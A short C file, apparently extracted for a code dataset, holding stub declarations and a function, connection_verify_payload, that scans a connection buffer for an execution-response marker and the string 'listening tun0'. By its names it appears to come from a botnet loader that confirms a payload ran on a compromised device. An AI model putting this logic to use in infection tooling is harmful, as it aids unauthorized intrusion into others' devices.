#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct connection {int rdbuf_pos; int /*<<< orphan*/  rdbuf; } ;

/* Variables and functions */
 char* EXEC_RESPONSE ; 
 int strlen (char*) ; 
 int util_memsearch (int /*<<< orphan*/ ,int,char*,int) ; 

int connection_verify_payload(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
        return offset;
    else
        return 255 + offset;
}